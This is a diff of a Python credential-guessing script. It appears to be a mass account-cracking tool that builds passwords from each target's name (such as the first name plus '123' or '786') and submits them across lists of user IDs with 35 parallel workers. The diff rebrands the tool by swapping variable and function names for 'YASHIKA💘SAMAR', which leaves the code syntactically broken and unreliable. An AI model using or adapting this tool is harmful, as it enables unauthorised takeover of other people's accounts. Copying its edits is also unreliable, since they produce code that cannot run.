@@ -551,9 +551,9 @@ class __chigoue__:
     def kombinasi_pw(self,url):
     	
         print('----------------------------------------')
-        print('\x1b[1;97m [1] Name  Single Paass \x1b[1;92m{Fast} ')
-        print('\x1b[1;97m [2] Name  Duble Paass  \x1b[1;92m{Normal}')
-        print('\x1b[1;97m [3] Name Three Paass \x1b[1;91m{Slow} ')
+        print('\x1b[1;97m [1] YASHIKA💘SAMAR  Single Paass \x1b[1;92m{Fast} ')
+        print('\x1b[1;97m [2] YASHIKA💘SAMAR  Duble Paass  \x1b[1;92m{Normal}')
+        print('\x1b[1;97m [3] YASHIKA💘SAMAR Three Paass \x1b[1;91m{Slow} ')
         print('\x1b[1;97m----------------------------------------')
         pw = input(f"\x1b[1;97m [+] Select Password Method : ")
         os.system ('clear')
@@ -568,12 +568,12 @@ class __chigoue__:
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
                    try:
-                       uid, name = yntkts.split('|')
-                       xz = name.split(' ')
+                       uid, YASHIKA💘SAMAR = yntkts.split('|')
+                       xz = YASHIKA💘SAMAR.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+                           pwx = [YASHIKA💘SAMAR, xz[0]+xz[1], xz[0]+"123"]
                        else:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+                           pwx = [YASHIKA💘SAMAR, xz[0]+xz[1], xz[0]+"123"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
@@ -586,12 +586,12 @@ class __chigoue__:
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
                    try:
-                       uid, name = yntkts.split('|')
-                       xz = name.split(' ')
+                       uid, YASHIKA💘SAMAR = yntkts.split('|')
+                       xz = YASHIKA💘SAMAR.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
+                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
                        else:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
+                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
                        kirim.submit(self.__metode1__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
@@ -603,14 +603,14 @@ class __chigoue__:
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
                    try:
-                       uid, name = yntkts.split('|')
-                       xz = name.split(' ')
+                       uid, YASHIKA💘SAMAR = yntkts.split('|')
+                       xz = YASHIKA💘SAMAR.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                        else:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
-            hasil(ok,cp)
+            YASHIKA💘SAMAR(ok,cp)
 if __name__ == '__main__':
     file()
